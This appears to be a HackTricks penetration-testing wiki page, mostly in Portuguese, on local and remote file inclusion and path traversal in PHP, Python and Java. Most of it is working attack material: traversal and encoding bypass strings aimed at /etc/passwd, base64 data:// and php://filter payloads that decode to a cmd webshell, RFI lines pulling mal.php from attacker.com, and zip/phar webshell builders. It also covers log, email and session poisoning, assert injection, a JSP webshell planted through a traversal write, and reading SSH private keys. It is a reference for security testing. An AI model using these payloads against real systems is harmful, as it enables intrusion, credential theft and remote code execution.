# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** O arquivo é carregado de um servidor remoto (Melhor: você pode escrever o código e o servidor irá executá-lo). Em php isso está **desativado** por padrão (**allow_url_include**).\
**Local File Inclusion (LFI):** O servidor carrega um arquivo local.

A vulnerabilidade ocorre quando o usuário consegue, de alguma forma, controlar qual arquivo será carregado pelo servidor.

Funções **PHP** vulneráveis: require, require_once, include, include_once

Uma ferramenta interessante para explorar essa vulnerabilidade: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Misturando várias listas LFI \*nix e adicionando mais caminhos, criei esta:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Tente também trocar `/` por `\`\
Tente também adicionar `../../../../../`

A lista que usa várias técnicas para encontrar o arquivo /etc/password (para verificar se a vulnerabilidade existe) pode ser encontrada [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mesclagem de diferentes wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Tente também trocar `/` por `\`\
Tente também remover `C:/` e adicionar `../../../../../`

A lista que usa várias técnicas para encontrar o arquivo /boot.ini (para verificar se a vulnerabilidade existe) pode ser encontrada [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Verifique a lista de LFI do linux.

## LFI básico e bypasses

Todos os exemplos são para Local File Inclusion mas também podem ser aplicados a Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences removidas não recursivamente
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass o acréscimo de mais chars no final da string fornecida (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Isto foi **resolvido desde o PHP 5.4**

### **Codificação**

Você pode usar codificações não padrão como double URL encode (e outras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### De uma pasta existente

Talvez o back-end esteja verificando o caminho da pasta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Explorando diretórios do sistema de arquivos em um servidor

O sistema de arquivos de um servidor pode ser explorado recursivamente para identificar diretórios, não apenas arquivos, empregando certas técnicas. Esse processo envolve determinar a profundidade do diretório e sondar a existência de pastas específicas. Abaixo está um método detalhado para conseguir isso:

1. **Determinar a profundidade do diretório:** Estabeleça a profundidade do seu diretório atual obtendo com sucesso o arquivo /etc/passwd (aplicável se o servidor for baseado em Linux). Um exemplo de URL pode ser estruturado da seguinte forma, indicando uma profundidade de três:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Procurar por pastas:** Anexe o nome da pasta suspeita (por exemplo, `private`) à URL, depois navegue de volta para `/etc/passwd`. O nível de diretório adicional exige aumentar a profundidade em uma unidade:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretar os resultados:** O response do servidor indica se a pasta existe:
- **Erro / Sem saída:** A pasta `private` provavelmente não existe no local especificado.
- **Conteúdo de `/etc/passwd`:** A presença da pasta `private` está confirmada.
4. **Exploração recursiva:** Pastas descobertas podem ser investigadas mais a fundo por subdiretórios ou arquivos usando a mesma técnica ou os métodos tradicionais Local File Inclusion (LFI).

Para explorar diretórios em diferentes locais do sistema de arquivos, ajuste o payload de acordo. Por exemplo, para verificar se `/var/www/` contém um diretório `private` (assumindo que o diretório atual está em uma profundidade de 3), use:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation é um método empregado para manipular caminhos de arquivo em aplicações web. É frequentemente usado para acessar arquivos restritos contornando certas medidas de segurança que adicionam caracteres adicionais ao final dos caminhos de arquivo. O objetivo é criar um caminho de arquivo que, uma vez alterado pela medida de segurança, ainda aponte para o arquivo desejado.

Em PHP, várias representações de um caminho de arquivo podem ser consideradas equivalentes devido à natureza do sistema de arquivos. Por exemplo:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` são todos tratados como o mesmo caminho.
- Quando os últimos 6 caracteres são `passwd`, acrescentar um `/` (transformando em `passwd/`) não altera o arquivo alvo.
- Da mesma forma, se `.php` é anexado a um caminho de arquivo (como `shellcode.php`), adicionar um `/.` no final não alterará o arquivo acessado.

Os exemplos fornecidos demonstram como utilizar Path truncation para acessar `/etc/passwd`, um alvo comum devido ao seu conteúdo sensível (informações de contas de usuário):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Nesses cenários, o número de travessias necessárias pode ser cerca de 2027, mas esse número pode variar com base na configuração do servidor.

- **Using Dot Segments and Additional Characters**: Sequências de traversal (`../`) combinadas com segmentos de ponto adicionais e caracteres podem ser usadas para navegar no sistema de arquivos, ignorando efetivamente strings anexadas pelo servidor.
- **Determining the Required Number of Traversals**: Por tentativa e erro, é possível encontrar o número preciso de sequências `../` necessário para navegar até o diretório raiz e depois para `/etc/passwd`, garantindo que quaisquer strings anexadas (como `.php`) sejam neutralizadas, mas o caminho desejado (`/etc/passwd`) permaneça intacto.
- **Starting with a Fake Directory**: É prática comum começar o caminho com um diretório inexistente (como `a/`). Essa técnica é usada como medida de precaução ou para satisfazer os requisitos da lógica de análise de caminhos do servidor.

Ao empregar técnicas de truncamento de caminho, é crucial entender o comportamento de análise de caminhos do servidor e a estrutura do sistema de arquivos. Cada cenário pode exigir uma abordagem diferente, e testes são frequentemente necessários para encontrar o método mais eficaz.

**Esta vulnerabilidade foi corrigida no PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

No php isso está desabilitado por padrão porque **`allow_url_include`** está **Off.** Deve estar **On** para funcionar, e nesse caso você poderia incluir um arquivo PHP do seu servidor e obter RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se por algum motivo **`allow_url_include`** estiver **On**, mas o PHP estiver **filtrando** o acesso a páginas externas, [de acordo com este post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), você poderia usar, por exemplo, o protocolo data com base64 para decodificar um código PHP em b64 e obter RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> No código anterior, o `+.txt` final foi adicionado porque o atacante precisava de uma string que terminasse em `.txt`, então a string termina com isso e, após a decodificação b64, essa parte retornará apenas lixo e o código PHP real será incluído (e, portanto, executado).
>
> Outro exemplo **não usando o protocolo `php://`** seria:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Elemento raiz em Python

Em Python, em um código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se o usuário passar um **caminho absoluto** para **`file_name`**, o **caminho anterior é simplesmente removido**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Isso é o comportamento pretendido de acordo com [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se um componente for um caminho absoluto, todos os componentes anteriores são descartados e a junção continua a partir do componente de caminho absoluto.

## Java Listar Diretórios

Parece que, se você tiver um Path Traversal em Java e você **pedir um diretório** em vez de um arquivo, **uma listagem do diretório será retornada**. Isso não acontecerá em outras linguagens (pelo que sei).

## Top 25 parâmetros

Aqui está a lista dos 25 principais parâmetros que podem ser vulneráveis a local file inclusion (LFI) (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **operações de modificação nos dados** antes de serem lidos ou escritos. Existem 5 categorias de filtros:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Remove tags dos dados (tudo entre os caracteres "<" e ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . Para obter a **lista de todas as codificações** suportadas execute no console: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **gerar texto arbitrário**, o que pode ser útil para escrever texto arbitrário ou fazer com que uma função como include processe texto arbitrário. Para mais info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Comprimir o conteúdo (useful if exfiltrating a lot of info)
- `zlib.inflate`: Descomprimir os dados
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Outros filtros
- Executando em php `var_dump(stream_get_filters());` você pode encontrar alguns **filtros inesperados**:
- `consumed`
- `dechunk`: reverte a codificação chunked do HTTP
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> A parte "php://filter" não diferencia maiúsculas de minúsculas

### Usando php filters como oráculo para ler arquivos arbitrários

[**Neste post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) é proposta uma técnica para ler um arquivo local sem que a saída seja retornada pelo servidor. Esta técnica baseia-se numa **exfiltração booleana do arquivo (char por char) usando php filters** como oráculo. Isto ocorre porque php filters podem ser usados para tornar um texto grande o suficiente para que o php lance uma exceção.

No post original você encontra uma explicação detalhada da técnica, mas aqui vai um resumo rápido:

- Use o codec **`UCS-4LE`** para deixar o caractere inicial do texto no começo e fazer o tamanho da string crescer exponencialmente.
- Isto será usado para gerar um **texto tão grande quando a letra inicial for adivinhada corretamente** que o php irá disparar um **erro**
- O filtro **dechunk** irá **remover tudo se o primeiro char não for hexadecimal**, então podemos saber se o primeiro char é hex.
- Isso, combinado com o anterior (e outros filtros dependendo da letra adivinhada), permitirá adivinhar uma letra no início do texto ao ver quando fazemos transformações suficientes para que ela deixe de ser um caractere hexadecimal. Porque se for hex, dechunk não a apagará e a bomba inicial fará o php gerar erro.
- O codec **convert.iconv.UNICODE.CP930** transforma cada letra na seguinte (então após esse codec: a -> b). Isto nos permite descobrir se a primeira letra é um `a`, por exemplo, porque se aplicarmos 6 vezes este codec a->b->c->d->e->f->g a letra não é mais um caractere hexadecimal, portanto dechunk não a remove e o erro do php é disparado porque multiplica com a bomba inicial.
- Usando outras transformações como **rot13** no começo é possível vazar outros chars como n, o, p, q, r (e outros codecs podem ser usados para deslocar outras letras para a faixa hex).
- Quando o caractere inicial for um número, é necessário codificá-lo em base64 e vazar as 2 primeiras letras para exfiltrar o número.
- O problema final é ver **como vazar mais do que a letra inicial**. Usando filtros de ordem de memória como **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** é possível mudar a ordem dos chars e colocar em primeira posição outras letras do texto.
- E para ser capaz de obter **dados adicionais** a ideia é **gerar 2 bytes de junk no início** com **convert.iconv.UTF16.UTF16**, aplicar **UCS-4LE** para fazer um **pivot com os próximos 2 bytes**, e **deletar os dados até o junk** (isso removerá os primeiros 2 bytes do texto inicial). Continue fazendo isso até alcançar o bit desejado para vazar.

No post também foi divulgado uma ferramenta para executar isso automaticamente: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Este wrapper permite acessar file descriptors que o processo tem abertos. Potencialmente útil para exfiltrar o conteúdo de arquivos abertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout e php://stderr** to access the **file descriptors 0, 1 e 2** respectively (não tenho certeza de como isso poderia ser útil em um attack)

### zip:// e rar://

Upload um arquivo Zip ou Rar com um PHPShell dentro e acesse-o.\
Para poder abusar do rar protocol, ele **precisa ser ativado especificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Observe que este protocolo é restrito pelas configurações do PHP **`allow_url_open`** e **`allow_url_include`**

### expect://

O Expect precisa estar ativado. Você pode executar código usando isto:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique seu payload nos parâmetros POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Um arquivo `.phar` pode ser utilizado para executar código PHP quando uma aplicação web utiliza funções como `include` para carregamento de arquivos. O snippet de código PHP abaixo demonstra a criação de um arquivo `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Para compilar o arquivo `.phar`, o seguinte comando deve ser executado:
```bash
php --define phar.readonly=0 create_path.php
```
Ao ser executado, um arquivo chamado `test.phar` será criado, o qual pode ser potencialmente aproveitado para explorar vulnerabilidades de Local File Inclusion (LFI).

Em casos onde o LFI apenas realiza leitura de arquivos sem executar o código PHP contido — por meio de funções como `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ou `filesize()` — pode-se tentar explorar uma vulnerabilidade de deserialization. Essa vulnerabilidade está associada à leitura de arquivos usando o protocolo `phar`.

Para um entendimento detalhado sobre a exploração de vulnerabilidades de deserialization no contexto de arquivos `.phar`, consulte o documento vinculado abaixo:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Foi possível abusar de **any arbitrary file read from PHP that supports php filters** para obter RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Resumo muito rápido: um **3 byte overflow** no heap do PHP foi abusado para **alterar a cadeia de free chunks** de um tamanho específico a fim de poder **escrever qualquer coisa em qualquer endereço**, então foi adicionado um hook para chamar **`system`**.\
Foi possível alocar chunks de tamanhos específicos abusando de mais php filters.

### Mais protocolos

Confira mais possíveis[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escrever na memória ou em um arquivo temporário (não tenho certeza de como isso pode ser útil em um ataque de file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Acesso ao sistema de arquivos local
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Acessando URLs HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acessando URLs FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Encontrar pathnames que casam com um padrão (não retorna nada imprimível, então não é realmente útil aqui)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Streams de áudio (não útil para ler arquivos arbitrários)

## LFI via PHP's 'assert'

Os riscos de Local File Inclusion (LFI) em PHP são notavelmente altos ao lidar com a função 'assert', que pode executar código dentro de strings. Isso é particularmente problemático se entradas contendo caracteres de directory traversal como ".." estiverem sendo verificadas mas não devidamente sanitizadas.

Por exemplo, o código PHP pode ser projetado para prevenir directory traversal da seguinte forma:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Embora isso vise impedir traversal, cria inadvertidamente um vetor para code injection. Para explorar isso e ler o conteúdo de arquivos, um atacante poderia usar:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
De forma semelhante, para executar comandos arbitrários do sistema, pode-se usar:
```plaintext
' and die(system("id")) or '
```
É importante **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Esta técnica é relevante em casos onde você **controla** o **caminho do arquivo** de uma **função PHP** que irá **acessar um arquivo** mas você não verá o conteúdo do arquivo (como uma chamada simples para **`file()`**) já que o conteúdo não é mostrado.

Em [**este post incrível**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) é explicado como um blind path traversal pode ser abusado via PHP filter para **exfiltrar o conteúdo de um arquivo via um error oracle**.

Como resumo, a técnica usa a codificação **"UCS-4LE"** para tornar o conteúdo de um arquivo tão **grande** que a **função PHP que abre** o arquivo irá disparar um **erro**.

Depois, para leak do primeiro char o filter **`dechunk`** é usado junto com outros como **base64** ou **rot13** e, finalmente, os filters **`convert.iconv.UCS-4.UCS-4LE`** e **`convert.iconv.UTF16.UTF-16BE`** são usados para colocar outros chars no começo e leak them.

Funções que podem ser vulneráveis: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para os detalhes técnicos, consulte o post mencionado!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Quando o código do lado servidor que ingere/upload de arquivos constrói o caminho de destino usando dados controlados pelo usuário (por exemplo, um filename ou URL) sem canonicalizar e validar, segmentos `..` e paths absolutos podem escapar do diretório pretendido e causar uma gravação arbitrária de arquivo. Se você conseguir colocar o payload sob um diretório exposto na web, normalmente obtém RCE não autenticado ao dropar um webshell.

Fluxo de exploração típico:
- Identificar uma write primitive em um endpoint ou background worker que aceite um path/filename e escreva conteúdo no disco (por exemplo, ingestão orientada por mensagens, command handlers XML/JSON, ZIP extractors, etc.).
- Determinar diretórios expostos na web. Exemplos comuns:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Criar um caminho de traversal que saia do diretório de armazenamento pretendido para o webroot, e incluir o conteúdo do seu webshell.
- Acesse o payload que você colocou e execute comandos.

Notas:
- O serviço vulnerável que realiza a escrita pode escutar em uma porta não-HTTP (por exemplo, um JMF XML listener em TCP 4004). O portal web principal (porta diferente) servirá seu payload posteriormente.
- Em stacks Java, essas escritas de arquivos frequentemente são implementadas com concatenação simples de `File`/`Paths`. Falta de canonicalisation/allow-listing é a falha central.

Exemplo genérico em estilo XML/JMF (schemas de produto variam – o wrapper DOCTYPE/body é irrelevante para o traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Medidas de hardening que impedem essa classe de bugs:
- Resolva para um caminho canônico e verifique que ele seja descendente de um diretório base allow-listed.
- Rejeite qualquer caminho contendo `..`, raízes absolutas, ou letras de unidade; prefira nomes de arquivo gerados.
- Execute o writer como uma conta de baixo privilégio e segregue os diretórios de escrita das raízes servidas.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Se o servidor Apache ou Nginx for **vulnerable to LFI** dentro da função include você pode tentar acessar **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, colocar no **user agent** ou em um **parâmetro GET** um php shell como **`<?php system($_GET['c']); ?>`** e incluir esse arquivo

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

Isso também pode ser feito em outros logs mas **cuidado,** o código dentro dos logs pode estar URL encoded e isso pode destruir a Shell. O header **authorisation "basic"** contém "user:password" em Base64 e ele é decodificado dentro dos logs. O PHPShell pode ser inserido dentro desse header.\
Outros caminhos de logs possíveis:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via e-mail

**Envie um e-mail** para uma conta interna (user@localhost) contendo seu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e tente incluir o e-mail do usuário com um caminho como **`/var/mail/<USERNAME>`** ou **`/var/spool/mail/<USERNAME>`**

### Via /proc/*/fd/*

1. Faça upload de muitas shells (por exemplo: 100)
2. Inclua [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), com $PID = PID do processo (pode ser brute forced) e $FD o descritor de arquivo (também pode ser brute forced)

### Via /proc/self/environ

Como um arquivo de log, envie o payload no User-Agent — ele será refletido dentro do arquivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se você puder fazer upload de um arquivo, basta injetar o shell payload nele (ex: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para manter o arquivo legível, é melhor injetar nos metadados das imagens/doc/pdf

### Via upload de arquivo ZIP

Upload um arquivo ZIP contendo um PHP shell comprimido e acesse:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Verifique se o site usa PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
No PHP, essas sessões são armazenadas em arquivos _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Defina o cookie para `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Use o LFI para incluir o arquivo de sessão PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se o ssh estiver ativo, verifique qual user está sendo usado (/proc/self/status & /etc/passwd) e tente acessar **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

Os logs do FTP server vsftpd estão localizados em _**/var/log/vsftpd.log**_. No cenário em que existe uma vulnerabilidade de Local File Inclusion (LFI), e é possível acessar um servidor vsftpd exposto, os seguintes passos podem ser considerados:

1. Injete um payload PHP no campo username durante o processo de login.
2. Após a injeção, utilize o LFI para recuperar os logs do servidor em _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Como mostrado em [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artigo, PHP base64 filter simplesmente ignora Non-base64. Você pode usar isso para burlar a checagem de extensão de arquivo: se você fornecer base64 que termine com ".php", ele simplesmente vai ignorar o "." e anexar "php" ao base64. Aqui está um exemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters to generate arbitrary content** as output. O que basicamente significa que você pode **generate arbitrary php code** para o include **sem precisar escrevê‑lo** em um arquivo.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** um arquivo que será armazenado como **temporário** em `/tmp`, então na **mesma requisição,** provoque um **segmentation fault**, e então o **arquivo temporário não será deletado** e você pode procurá‑lo.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Se você encontrou uma **Local File Inclusion** e **Nginx** está rodando na frente do PHP, você pode conseguir RCE com a técnica a seguir:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Se você encontrou uma **Local File Inclusion** mesmo se você **não tiver uma sessão** e `session.auto_start` estiver `Off`. Se você fornecer o **`PHP_SESSION_UPLOAD_PROGRESS`** em dados **multipart POST**, o PHP irá **ativar a sessão para você**. Você pode abusar disso para obter RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Se você encontrou uma **Local File Inclusion** e o servidor está rodando em **Windows**, você pode conseguir RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Além disso, é possível passar argumentos para o script via a URL porque está indicado que se um parâmetro de URL não tiver um `=`, ele deve ser usado como argumento. Veja também [watchTowr’s write‑up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

A requisição a seguir cria um arquivo em `/tmp/hello.php` com o conteúdo `<?=phpinfo()?>`:
```bash
